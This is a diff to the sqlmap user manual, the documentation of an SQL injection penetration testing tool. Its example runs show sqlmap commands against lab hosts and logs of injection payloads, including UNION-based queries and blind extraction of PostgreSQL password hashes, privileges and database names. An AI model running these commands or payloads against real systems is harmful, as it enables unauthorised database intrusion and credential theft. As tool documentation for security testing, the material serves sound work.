@@ -16,8 +16,13 @@ for the latest version.
 
 <sect>Introduction
 <p>
-sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of back-end database servers.
-It comes with a broad range of features lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.
+sqlmap is an open source penetration testing tool that automates the
+process of detecting and exploiting SQL injection flaws and taking over of
+back-end database servers.
+It comes with a broad range of features lasting from database
+fingerprinting, over data fetching from the database, to accessing the
+underlying file system and executing commands on the operating system via
+out-of-band connections.
 
 
 <sect1>Requirements
@@ -554,12 +559,12 @@ Options:
     --current-db        Retrieve DBMS current database
     --is-dba            Detect if the DBMS current user is DBA
     --users             Enumerate DBMS users
-    --passwords         Enumerate DBMS users password hashes (opt -U)
-    --privileges        Enumerate DBMS users privileges (opt -U)
+    --passwords         Enumerate DBMS users password hashes
+    --privileges        Enumerate DBMS users privileges
     --dbs               Enumerate DBMS databases
-    --tables            Enumerate DBMS database tables (opt -D)
-    --columns           Enumerate DBMS database table columns (req -T opt -D)
-    --dump              Dump DBMS database table entries (req -T, opt -D, -C)
+    --tables            Enumerate DBMS database tables
+    --columns           Enumerate DBMS database table columns
+    --dump              Dump DBMS database table entries
     --dump-all          Dump all DBMS databases tables entries
     -D DB               DBMS database to enumerate
     -T TBL              DBMS database table to enumerate
@@ -897,16 +902,10 @@ do you want to test this url? [Y/n/q] y
 [hh:mm:29] [INFO] testing for parenthesis on injectable parameter
 [hh:mm:29] [INFO] the injectable parameter requires 0 parenthesis
 [hh:mm:29] [INFO] testing MySQL
-[hh:mm:29] [INFO] query: CONCAT(CHAR(57), CHAR(57))
 [hh:mm:29] [INFO] retrieved: 99
-[hh:mm:29] [INFO] performed 20 queries in 0 seconds
 [hh:mm:29] [INFO] confirming MySQL
-[hh:mm:29] [INFO] query: LENGTH(CHAR(57))
 [hh:mm:29] [INFO] retrieved: 1
-[hh:mm:29] [INFO] performed 13 queries in 0 seconds
-[hh:mm:29] [INFO] query: SELECT 9 FROM information_schema.TABLES LIMIT 0, 1
 [hh:mm:29] [INFO] retrieved: 9
-[hh:mm:29] [INFO] performed 13 queries in 0 seconds
 web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
 web application technology: PHP 5.2.6, Apache 2.2.9
 back-end DBMS: MySQL >= 5.0.0
@@ -1076,13 +1075,9 @@ $ python sqlmap.py -u "http://172.16.213.131/sqlmap/oracle/post_int.php" --metho
 [hh:mm:54] [INFO] POST parameter 'id' is numeric/unescaped injectable
 [...]
 [hh:mm:54] [INFO] testing Oracle
-[hh:mm:54] [INFO] query: LENGTH(SYSDATE)
 [hh:mm:54] [INFO] retrieved: 9
-[hh:mm:54] [INFO] performed 13 queries in 0 seconds
 [hh:mm:54] [INFO] confirming Oracle
-[hh:mm:54] [INFO] query: SELECT VERSION FROM SYS.PRODUCT_COMPONENT_VERSION WHERE ROWNUM=1
 [hh:mm:54] [INFO] retrieved: 10.2.0.1.0
-[hh:mm:55] [INFO] performed 76 queries in 0 seconds
 web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
 web application technology: PHP 5.2.6, Apache 2.2.9
 back-end DBMS:    Oracle
@@ -1498,12 +1493,9 @@ back-end DBMS: MySQL >= 5.0.0
 
 [hh:mm:18] [INFO] fetching current user
 [hh:mm:18] [INFO] retrieving the length of query output
-[hh:mm:18] [INFO] query: IFNULL(CAST(LENGTH(CURRENT_USER()) AS CHAR(10000)), CHAR(32))
 [hh:mm:18] [INFO] retrieved: 18
-[hh:mm:19] [INFO] query: IFNULL(CAST(CURRENT_USER() AS CHAR(10000)), CHAR(32))
 [hh:mm:19] [INFO] starting 3 threads
 [hh:mm:19] [INFO] retrieved: testuser@localhost
-[hh:mm:19] [INFO] performed 126 queries in 0 seconds
 current user:    'testuser@localhost'
 </verb></tscreen>
 
@@ -1633,16 +1625,10 @@ $ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/ua_str.php" -v 1 \
 [hh:mm:41] [INFO] testing for parenthesis on injectable parameter
 [hh:mm:41] [INFO] the injectable parameter requires 0 parenthesis
 [hh:mm:41] [INFO] testing MySQL
-[hh:mm:41] [INFO] query: CONCAT(CHAR(52), CHAR(52))
 [hh:mm:41] [INFO] retrieved: 44
-[hh:mm:41] [INFO] performed 20 queries in 0 seconds
 [hh:mm:41] [INFO] confirming MySQL
-[hh:mm:41] [INFO] query: LENGTH(CHAR(52))
 [hh:mm:41] [INFO] retrieved: 1
-[hh:mm:41] [INFO] performed 13 queries in 0 seconds
-[hh:mm:41] [INFO] query: SELECT 4 FROM information_schema.TABLES LIMIT 0, 1
 [hh:mm:41] [INFO] retrieved: 4
-[hh:mm:41] [INFO] performed 13 queries in 0 seconds
 web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
 web application technology: PHP 5.2.6, Apache 2.2.9
 back-end DBMS: MySQL >= 5.0.0
@@ -2017,6 +2003,11 @@ stability test.
 
 <sect1>Techniques
 
+<p>
+These options can be used to test for specific SQL injection technique or
+to use one of them to exploit the affected parameter(s) rather than using
+the default blind SQL injection technique.
+
 <sect2>Test for stacked queries (multiple statements) support
 
 <p>
@@ -2249,7 +2240,7 @@ ahead.
 Example on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mssql/get_int.php?id=1" -v 1 \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mssql/get_int.php?id=1" -v 2 \
   --union-use --banner
 
 [...]
@@ -2262,10 +2253,10 @@ technique
 [hh:mm:42] [INFO] confirming full inband sql injection on parameter 'id'
 [hh:mm:42] [INFO] the target url is affected by an exploitable full inband sql injection 
 vulnerability
-[hh:mm:42] [INFO] query:  UNION ALL SELECT NULL, (CHAR(110)+CHAR(83)+CHAR(68)+CHAR(80)+
+[hh:mm:42] [DEBUG] query:  UNION ALL SELECT NULL, (CHAR(110)+CHAR(83)+CHAR(68)+CHAR(80)+
 CHAR(84)+CHAR(70))+ISNULL(CAST(@@VERSION AS VARCHAR(8000)), (CHAR(32)))+(CHAR(70)+CHAR(82)+
 CHAR(100)+CHAR(106)+CHAR(72)+CHAR(75)), NULL-- AND 5204=5204
-[hh:mm:42] [INFO] performed 3 queries in 0 seconds
+[hh:mm:42] [DEBUG] performed 3 queries in 0 seconds
 banner:
 ---
 Microsoft SQL Server  2000 - 8.00.194 (Intel X86) 
@@ -2290,7 +2281,7 @@ $ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" -v 5
 [...]
 [hh:mm:29] [INFO] the target url is affected by an exploitable full inband sql 
 injection vulnerability
-[hh:mm:29] [INFO] query:  UNION ALL SELECT NULL, CONCAT(CHAR(112,110,121,77,88,86),
+[hh:mm:29] [DEBUG] query:  UNION ALL SELECT NULL, CONCAT(CHAR(112,110,121,77,88,86),
 IFNULL(CAST(CURRENT_USER() AS CHAR(10000)), CHAR(32)),CHAR(72,89,75,77,121,103)), 
 NULL# AND 8032=8032
 [hh:mm:29] [TRAFFIC OUT] HTTP request:
@@ -2323,7 +2314,7 @@ Content-Type: text/html
 &lt;/table&gt;
 &lt;/body&gt;&lt;/html&gt;
 
-[hh:mm:29] [INFO] performed 3 queries in 0 seconds
+[hh:mm:29] [DEBUG] performed 3 queries in 0 seconds
 current user:    'testuser@localhost'
 </verb></tscreen>
 
@@ -2342,7 +2333,7 @@ entry is displayed in the page content.
 Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int_partialunion.php?id=1" -v 1 \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int_partialunion.php?id=1" -v 2 \
   --union-use --dbs
 
 [...]
@@ -2358,32 +2349,32 @@ injection vulnerability
 [hh:mm:56] [INFO] confirming partial inband sql injection on parameter 'id'
 [hh:mm:56] [INFO] the target url is affected by an exploitable partial inband sql injection 
 vulnerability
-[hh:mm:56] [INFO] query:  UNION ALL SELECT NULL, CONCAT(CHAR(90,121,78,99,122,76),
+[hh:mm:56] [DEBUG] query:  UNION ALL SELECT NULL, CONCAT(CHAR(90,121,78,99,122,76),
 IFNULL(CAST(COUNT(schema_name) AS CHAR(10000)), CHAR(32)),CHAR(110,97,105,116,84,120)), NULL 
 FROM information_schema.SCHEMATA# AND 1062=1062
-[hh:mm:56] [INFO] performed 6 queries in 0 seconds
+[hh:mm:56] [DEBUG] performed 6 queries in 0 seconds
 [hh:mm:56] [INFO] the SQL query provided returns 4 entries
-[hh:mm:56] [INFO] query:  UNION ALL SELECT NULL, CONCAT(CHAR(90,121,78,99,122,76),IFNULL(
+[hh:mm:56] [DEBUG] query:  UNION ALL SELECT NULL, CONCAT(CHAR(90,121,78,99,122,76),IFNULL(
 CAST(schema_name AS CHAR(10000)), CHAR(32)),CHAR(110,97,105,116,84,120)), NULL FROM 
 information_schema.SCHEMATA LIMIT 0, 1# AND 1421=1421
-[hh:mm:56] [INFO] performed 7 queries in 0 seconds
-[hh:mm:56] [INFO] query:  UNION ALL SELECT NULL, CONCAT(CHAR(90,121,78,99,122,76),IFNULL(
+[hh:mm:56] [DEBUG] performed 7 queries in 0 seconds
+[hh:mm:56] [DEBUG] query:  UNION ALL SELECT NULL, CONCAT(CHAR(90,121,78,99,122,76),IFNULL(
 CAST(schema_name AS CHAR(10000)), CHAR(32)),CHAR(110,97,105,116,84,120)), NULL FROM 
 information_schema.SCHEMATA LIMIT 1, 1# AND 9553=9553
-[hh:mm:56] [INFO] performed 8 queries in 0 seconds
-[hh:mm:56] [INFO] query:  UNION ALL SELECT NULL, CONCAT(CHAR(90,121,78,99,122,76),IFNULL(
+[hh:mm:56] [DEBUG] performed 8 queries in 0 seconds
+[hh:mm:56] [DEBUG] query:  UNION ALL SELECT NULL, CONCAT(CHAR(90,121,78,99,122,76),IFNULL(
 CAST(schema_name AS CHAR(10000)), CHAR(32)),CHAR(110,97,105,116,84,120)), NULL FROM 
 information_schema.SCHEMATA LIMIT 2, 1# AND 6805=6805
-[hh:mm:56] [INFO] performed 9 queries in 0 seconds
-[hh:mm:56] [INFO] query:  UNION ALL SELECT NULL, CONCAT(CHAR(90,121,78,99,122,76),IFNULL(
+[hh:mm:56] [DEBUG] performed 9 queries in 0 seconds
+[hh:mm:56] [DEBUG] query:  UNION ALL SELECT NULL, CONCAT(CHAR(90,121,78,99,122,76),IFNULL(
 CAST(schema_name AS CHAR(10000)), CHAR(32)),CHAR(110,97,105,116,84,120)), NULL FROM 
 information_schema.SCHEMATA LIMIT 3, 1# AND 739=739
-[hh:mm:56] [INFO] performed 10 queries in 0 seconds
+[hh:mm:56] [DEBUG] performed 10 queries in 0 seconds
 available databases [4]:
 [*] information_schema
 [*] mysql
 [*] privatedb
-[*] test
+[*] testdb
 </verb></tscreen>
 
 <p>
@@ -2425,9 +2416,7 @@ $ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" -v 1
 [...]
 [hh:mm:17] [INFO] testing MySQL
 [hh:mm:17] [INFO] confirming MySQL
-[hh:mm:17] [INFO] query: SELECT 5 FROM information_schema.TABLES LIMIT 0, 1
 [hh:mm:17] [INFO] retrieved: 5
-[hh:mm:17] [INFO] performed 13 queries in 0 seconds
 [hh:mm:17] [INFO] the back-end DBMS is MySQL
 web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
 web application technology: PHP 5.2.6, Apache 2.2.9
@@ -2452,19 +2441,11 @@ $ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" -v 1
 [...]
 [hh:mm:49] [INFO] testing MySQL
 [hh:mm:49] [INFO] confirming MySQL
-[hh:mm:49] [INFO] query: SELECT 3 FROM information_schema.TABLES LIMIT 0, 1
 [hh:mm:49] [INFO] retrieved: 3
-[hh:mm:49] [INFO] performed 13 queries in 0 seconds
 [hh:mm:49] [INFO] the back-end DBMS is MySQL
-[hh:mm:49] [INFO] query: SELECT 3 FROM information_schema.PARAMETERS LIMIT 0, 1
 [hh:mm:49] [INFO] retrieved: 
-[hh:mm:49] [INFO] performed 6 queries in 0 seconds
-[hh:mm:49] [INFO] query: MID(@@table_open_cache, 1, 1)
 [hh:mm:49] [INFO] retrieved: 
-[hh:mm:49] [INFO] performed 6 queries in 0 seconds
-[hh:mm:49] [INFO] query: MID(@@hostname, 1, 1)
 [hh:mm:49] [INFO] retrieved: t
-[hh:mm:49] [INFO] performed 13 queries in 0 seconds
 [hh:mm:49] [INFO] executing MySQL comment injection fingerprint
 web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
 web application technology: PHP 5.2.6, Apache 2.2.9
@@ -2484,10 +2465,7 @@ $ python sqlmap.py -u "http://172.16.213.131/sqlmap/oracle/get_int.php?id=1" -v 
 [hh:mm:38] [INFO] testing Oracle
 [hh:mm:38] [INFO] confirming Oracle
 [hh:mm:38] [INFO] the back-end DBMS is Oracle
-[hh:mm:38] [INFO] query: SELECT SUBSTR((VERSION), 1, 2) FROM SYS.PRODUCT_COMPONENT_VERSION 
-WHERE ROWNUM=1
 [hh:mm:38] [INFO] retrieved: 10
-[hh:mm:38] [INFO] performed 20 queries in 0 seconds
 web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
 web application technology: PHP 5.2.6, Apache 2.2.9
 back-end DBMS: active fingerprint: Oracle 10g
@@ -2505,12 +2483,8 @@ $ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" -v 1
 [hh:mm:14] [INFO] testing PostgreSQL
 [hh:mm:14] [INFO] confirming PostgreSQL
 [hh:mm:14] [INFO] the back-end DBMS is PostgreSQL
-[hh:mm:14] [INFO] query: SUBSTR(TRANSACTION_TIMESTAMP()::text, 1, 1)
 [hh:mm:14] [INFO] retrieved: 2
-[hh:mm:14] [INFO] performed 13 queries in 0 seconds
-[hh:mm:14] [INFO] query: SUBSTR(TRANSACTION_TIMESTAMP(), 1, 1)
 [hh:mm:14] [INFO] retrieved: 
-[hh:mm:14] [INFO] performed 6 queries in 0 seconds
 web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
 web application technology: PHP 5.2.6, Apache 2.2.9
 back-end DBMS: active fingerprint: PostgreSQL >= 8.3.0
@@ -2564,27 +2538,27 @@ you can also provide the <tt>-b</tt> or <tt>-</tt><tt>-banner</tt> option.
 Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" -v 1 -f -b
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" -v 2 -f -b
 
 [...]
 [hh:mm:04] [INFO] testing MySQL
 [hh:mm:04] [INFO] confirming MySQL
-[hh:mm:04] [INFO] query: SELECT 0 FROM information_schema.TABLES LIMIT 0, 1
+[hh:mm:04] [DEBUG] query: SELECT 0 FROM information_schema.TABLES LIMIT 0, 1
 [hh:mm:04] [INFO] retrieved: 0
-[hh:mm:04] [INFO] performed 13 queries in 0 seconds
+[hh:mm:04] [DEBUG] performed 13 queries in 0 seconds
 [hh:mm:04] [INFO] the back-end DBMS is MySQL
-[hh:mm:04] [INFO] query: VERSION()
+[hh:mm:04] [DEBUG] query: VERSION()
 [hh:mm:04] [INFO] retrieved: 5.0.67-0ubuntu6
-[hh:mm:05] [INFO] performed 111 queries in 1 seconds
-[hh:mm:05] [INFO] query: SELECT 0 FROM information_schema.PARAMETERS LIMIT 0, 1
+[hh:mm:05] [DEBUG] performed 111 queries in 1 seconds
+[hh:mm:05] [DEBUG] query: SELECT 0 FROM information_schema.PARAMETERS LIMIT 0, 1
 [hh:mm:05] [INFO] retrieved: 
-[hh:mm:05] [INFO] performed 6 queries in 0 seconds
-[hh:mm:05] [INFO] query: MID(@@table_open_cache, 1, 1)
+[hh:mm:05] [DEBUG] performed 6 queries in 0 seconds
+[hh:mm:05] [DEBUG] query: MID(@@table_open_cache, 1, 1)
 [hh:mm:05] [INFO] retrieved: 
-[hh:mm:05] [INFO] performed 6 queries in 0 seconds
-[hh:mm:05] [INFO] query: MID(@@hostname, 1, 1)
+[hh:mm:05] [DEBUG] performed 6 queries in 0 seconds
+[hh:mm:05] [DEBUG] query: MID(@@hostname, 1, 1)
 [hh:mm:05] [INFO] retrieved: t
-[hh:mm:06] [INFO] performed 13 queries in 0 seconds
+[hh:mm:06] [DEBUG] performed 13 queries in 0 seconds
 [hh:mm:06] [INFO] executing MySQL comment injection fingerprint
 web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
 web application technology: PHP 5.2.6, Apache 2.2.9
@@ -2604,21 +2578,21 @@ operating system by parsing the DBMS banner value.
 Example on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mssql/get_int.php?id=1" -v 1 -f -b
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mssql/get_int.php?id=1" -v 2 -f -b
 
 [...]
 [hh:mm:03] [WARNING] the back-end DMBS is not PostgreSQL
 [hh:mm:03] [INFO] testing Microsoft SQL Server
 [hh:mm:03] [INFO] confirming Microsoft SQL Server
 [hh:mm:03] [INFO] the back-end DBMS is Microsoft SQL Server
-[hh:mm:03] [INFO] performed 13 queries in 0 seconds
-[hh:mm:03] [INFO] query: @@VERSION
+[hh:mm:03] [DEBUG] performed 13 queries in 0 seconds
+[hh:mm:03] [DEBUG] query: @@VERSION
 [hh:mm:03] [INFO] retrieved: Microsoft SQL Server  2000 - 8.00.194 (Intel X86) 
 	Aug  6 2000 00:57:48 
 	Copyright (c) 1988-2000 Microsoft Corporation
 	Standard Edition on Windows NT 5.0 (Build 2195: Service Pack 4)
 
-[hh:mm:08] [INFO] performed 1308 queries in 4 seconds
+[hh:mm:08] [DEBUG] performed 1308 queries in 4 seconds
 web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
 web application technology: PHP 5.2.6, Apache 2.2.9
 back-end DBMS operating system: Windows 2000 Service Pack 4
@@ -2633,20 +2607,20 @@ back-end DBMS:	active fingerprint: Microsoft SQL Server 2000
 Example on a <bf>Microsoft SQL Server 2005 Service Pack 0</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.123.36/sqlmap/get_str.asp?name=luther" -v 1 -f -b
+$ python sqlmap.py -u "http://192.168.123.36/sqlmap/get_str.asp?name=luther" -v 2 -f -b
 
 [...]
 [hh:mm:03] [WARNING] the back-end DMBS is not PostgreSQL
 [hh:mm:03] [INFO] testing Microsoft SQL Server
 [hh:mm:03] [INFO] confirming Microsoft SQL Server
 [hh:mm:03] [INFO] the back-end DBMS is Microsoft SQL Server
-[hh:mm:03] [INFO] query: @@VERSION
+[hh:mm:03] [DEBUG] query: @@VERSION
 [hh:mm:03] [INFO] retrieved: Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) 
 	Oct 14 2005 00:33:37 
 	Copyright (c) 1988-2005 Microsoft Corporation
 	Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 1)
 
-[hh:mm:15] [INFO] performed 1343 queries in 11 seconds
+[hh:mm:15] [DEBUG] performed 1343 queries in 11 seconds
 web server operating system: Windows 2003 or 2000
 web application technology: ASP.NET, Microsoft IIS 6.0, ASP
 back-end DBMS operating system: Windows 2003 Service Pack 1
@@ -2667,6 +2641,12 @@ name="SQLSecurity.com site"> and outputs it to the XML versions file.
 
 
 <sect1>Enumeration
+
+<p>
+These options can be used to enumerate the back-end database management
+system information, structure and data contained in the tables. Moreover
+you can run your own SQL statements.
+
 
 <sect2>Banner
 
@@ -2740,7 +2720,7 @@ Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86)
 </verb></tscreen>
 
 
-<sect2>Current user
+<sect2>Session user
 
 <p>
 Option: <tt>-</tt><tt>-current-user</tt>
@@ -2778,7 +2758,7 @@ current database:    'master'
 </verb></tscreen>
 
 
-<sect2>Detect if the DBMS current user is a database administrator
+<sect2>Detect if the session user is a database administrator (DBA)
 
 <p>
 Option: <tt>-</tt><tt>-is-dba</tt>
@@ -2791,16 +2771,16 @@ a database administrator.
 Example on a <bf>PostgreSQL 8.3.5</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" --is-dba -v 1
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" --is-dba -v 2
 
 [...]
 back-end DBMS: PostgreSQL
 
 [hh:mm:49] [INFO] testing if current user is DBA
-[hh:mm:49] [INFO] query: SELECT (CASE WHEN ((SELECT usesuper=true FROM pg_user WHERE 
+[hh:mm:49] [DEBUG] query: SELECT (CASE WHEN ((SELECT usesuper=true FROM pg_user WHERE 
 usename=CURRENT_USER OFFSET 0 LIMIT 1)) THEN 1 ELSE 0 END)
 [hh:mm:49] [INFO] retrieved: 1
-[hh:mm:50] [INFO] performed 13 queries in 0 seconds
+[hh:mm:50] [DEBUG] performed 13 queries in 0 seconds
 current user is DBA:    'True'
 </verb></tscreen>
 
@@ -2808,17 +2788,17 @@ current user is DBA:    'True'
 Example on an <bf>Oracle XE 10.2.0.1</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://172.16.213.131/sqlmap/oracle/get_int.php?id=1" --is-dba -v 1
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/oracle/get_int.php?id=1" --is-dba -v 2
 
 [...]
 back-end DBMS: Oracle
 
 [16:40:57] [INFO] testing if current user is DBA
-[16:40:58] [INFO] query: SELECT (CASE WHEN ((SELECT GRANTED_ROLE FROM DBA_ROLE_PRIVS WHERE 
+[16:40:58] [DEBUG] query: SELECT (CASE WHEN ((SELECT GRANTED_ROLE FROM DBA_ROLE_PRIVS WHERE 
 GRANTEE=SYS.LOGIN_USER AND GRANTED_ROLE=CHR(68)||CHR(66)||CHR(65))=CHR(68)||CHR(66)||CHR(65)) 
 THEN 1 ELSE 0 END) FROM DUAL
 [16:40:58] [INFO] retrieved: 1
-[16:40:58] [INFO] performed 13 queries in 0 seconds
+[16:40:58] [DEBUG] performed 13 queries in 0 seconds
 current user is DBA:    'True'
 </verb></tscreen>
 
@@ -2907,22 +2887,12 @@ $ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" --pa
 back-end DBMS: PostgreSQL
 
 [hh:mm:48] [INFO] fetching current user
-[hh:mm:48] [INFO] query: COALESCE(CAST(CURRENT_USER AS CHARACTER(10000)), CHR(32))
 [hh:mm:48] [INFO] retrieved: postgres
-[hh:mm:49] [INFO] performed 62 queries in 0 seconds
 [hh:mm:49] [INFO] fetching database users password hashes for current user
 [hh:mm:49] [INFO] fetching number of password hashes for user 'postgres'
-[hh:mm:49] [INFO] query: SELECT COALESCE(CAST(COUNT(DISTINCT(passwd)) AS CHARACTER(10000)), 
-CHR(32)) FROM pg_shadow WHERE usename=CHR(112)||CHR(111)||CHR(115)||CHR(116)||CHR(103)||
-CHR(114)||CHR(101)||CHR(115)
 [hh:mm:49] [INFO] retrieved: 1
-[hh:mm:49] [INFO] performed 13 queries in 0 seconds
 [hh:mm:49] [INFO] fetching password hashes for user 'postgres'
-[hh:mm:49] [INFO] query: SELECT DISTINCT(COALESCE(CAST(passwd AS CHARACTER(10000)), 
-CHR(32))) FROM pg_shadow WHERE usename=CHR(112)||CHR(111)||CHR(115)||CHR(116)||CHR(103)||
-CHR(114)||CHR(101)||CHR(115) OFFSET 0 LIMIT 1
 [hh:mm:49] [INFO] retrieved: md5d7d880f96044b72d0bba108ace96d1e4
-[hh:mm:51] [INFO] performed 251 queries in 2 seconds
 database management system users password hashes:
 [*] postgres [1]:
     password hash: md5d7d880f96034b72d0bba108afe96c1e7
@@ -3040,34 +3010,16 @@ $ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" --pa
 back-end DBMS: PostgreSQL
 
 [hh:mm:25] [INFO] fetching current user
-[hh:mm:25] [INFO] query: COALESCE(CAST(CURRENT_USER AS CHARACTER(10000)), CHR(32))
 [hh:mm:25] [INFO] retrieved: postgres
-[hh:mm:25] [INFO] performed 62 queries in 0 seconds
 [hh:mm:25] [INFO] fetching database users privileges for current user
 [hh:mm:25] [INFO] fetching number of privileges for user 'postgres'
-[hh:mm:25] [INFO] query: SELECT COALESCE(CAST(COUNT(DISTINCT(usename)) AS CHARACTER(10000)), 
-CHR(32)) FROM pg_user WHERE usename=CHR(112)||CHR(111)||CHR(115)||CHR(116)||CHR(103)||
-CHR(114)||CHR(101)||CHR(115)
 [hh:mm:25] [INFO] retrieved: 1
-[hh:mm:25] [INFO] performed 13 queries in 0 seconds
 [hh:mm:25] [INFO] fetching privileges for user 'postgres'
 [hh:mm:25] [INFO] the SQL query provided has more than a field. sqlmap will now unpack it 
 into distinct queries to be able to retrieve the output even if we are going blind
-[hh:mm:25] [INFO] query: SELECT COALESCE(CAST((CASE WHEN usecreatedb THEN 1 ELSE 0 END) AS 
-CHARACTER(10000)), CHR(32)) FROM pg_user WHERE usename=CHR(112)||CHR(111)||CHR(115)||
-CHR(116)||CHR(103)||CHR(114)||CHR(101)||CHR(115) OFFSET 0 LIMIT 1
 [hh:mm:25] [INFO] retrieved: 1
-[hh:mm:25] [INFO] performed 13 queries in 0 seconds
-[hh:mm:25] [INFO] query: SELECT COALESCE(CAST((CASE WHEN usesuper THEN 1 ELSE 0 END) AS 
-CHARACTER(10000)), CHR(32)) FROM pg_user WHERE usename=CHR(112)||CHR(111)||CHR(115)||
-CHR(116)||CHR(103)||CHR(114)||CHR(101)||CHR(115) OFFSET 0 LIMIT 1
 [hh:mm:25] [INFO] retrieved: 1
-[hh:mm:25] [INFO] performed 13 queries in 0 seconds
-[hh:mm:25] [INFO] query: SELECT COALESCE(CAST((CASE WHEN usecatupd THEN 1 ELSE 0 END) AS 
-CHARACTER(10000)), CHR(32)) FROM pg_user WHERE usename=CHR(112)||CHR(111)||CHR(115)||
-CHR(116)||CHR(103)||CHR(114)||CHR(101)||CHR(115) OFFSET 0 LIMIT 1
 [hh:mm:25] [INFO] retrieved: 1
-[hh:mm:25] [INFO] performed 13 queries in 0 seconds
 database management system users privileges:
 [*] postgres (administrator) [3]:
     privilege: catupd
@@ -3122,7 +3074,7 @@ Example on a <bf>MySQL 5.0.67</bf> target:
 <tscreen><verb>
 $ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" --tables -v 0
 
-Database: test
+Database: testdb
 [1 table]
 +---------------------------------------+
 | users                                 |
@@ -3182,9 +3134,9 @@ Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
 $ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" --tables \
-  -D test -v 0
+  -D testdb -v 0
 
-Database: test
+Database: testdb
 [1 table]
 +---------------------------------------+
 | users                                 |
@@ -3222,7 +3174,7 @@ system user.
 <sect2>Database table columns
 
 <p>
-Options: <tt>-</tt><tt>-columns</tt>, <tt>-T</tt> and <tt>-D</tt>
+Options: <tt>-</tt><tt>-columns</tt>, <tt>-C</tt>, <tt>-T</tt> and <tt>-D</tt>
 
 <p>
 It is possible to enumerate the list of columns for a specific database
@@ -3235,30 +3187,30 @@ Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
 $ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" --columns \
-  -T users -D test -v 1
+  -T users -D testdb -v 1
 
 [...]
 back-end DBMS: MySQL >= 5.0.0
 
-[hh:mm:25] [WARNING] missing database parameter, sqlmap is going to use the current 
-database to enumerate table 'users' columns
-[hh:mm:25] [INFO] fetching current database
-[hh:mm:25] [INFO] query: IFNULL(CAST(DATABASE() AS CHAR(10000)), CHAR(32))
-[hh:mm:25] [INFO] retrieved: test
-[hh:mm:25] [INFO] performed 34 queries in 0 seconds
-[hh:mm:25] [INFO] fetching columns for table 'users' on database 'test'
-[hh:mm:25] [INFO] fetching number of columns for table 'users' on database 'test'
-[...]
-Database: test
+[16:44:20] [INFO] fetching columns for table 'users' on database 'testdb'
+[16:44:20] [INFO] fetching number of columns for table 'users' on database 'testdb'
+[16:44:20] [INFO] retrieved: 3
+[16:44:20] [INFO] retrieved: id
+[16:44:20] [INFO] retrieved: int(11)
+[16:44:21] [INFO] retrieved: name
+[16:44:21] [INFO] retrieved: varchar(500)
+[16:44:21] [INFO] retrieved: surname
+[16:44:21] [INFO] retrieved: varchar(1000)
+Database: testdb
 Table: users
 [3 columns]
-+---------+-------------+
-| Column  | Type        |
-+---------+-------------+
-| id      | int(11)     |
-| name    | varchar(40) |
-| surname | varchar(60) |
-+---------+-------------+
++---------+---------------+
+| Column  | Type          |
++---------+---------------+
+| id      | int(11)       |
+| name    | varchar(500)  |
+| surname | varchar(1000) |
++---------+---------------+
 </verb></tscreen>
 
 <p>
@@ -3318,30 +3270,63 @@ $ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" --co
 [...]
 back-end DBMS: MySQL >= 5.0.0
 
-[hh:mm:13] [WARNING] missing database parameter, sqlmap is going to use the current 
+[16:47:45] [WARNING] missing database parameter, sqlmap is going to use the current 
 database to enumerate table 'users' columns
-[hh:mm:13] [INFO] fetching current database
-[hh:mm:13] [INFO] query: IFNULL(CAST(DATABASE() AS CHAR(10000)), CHAR(32))
-[hh:mm:13] [INFO] retrieved: test
-[hh:mm:13] [INFO] performed 34 queries in 0 seconds
-[hh:mm:13] [INFO] fetching columns for table 'users' on database 'test'
-[hh:mm:13] [INFO] fetching number of columns for table 'users' on database 'test'
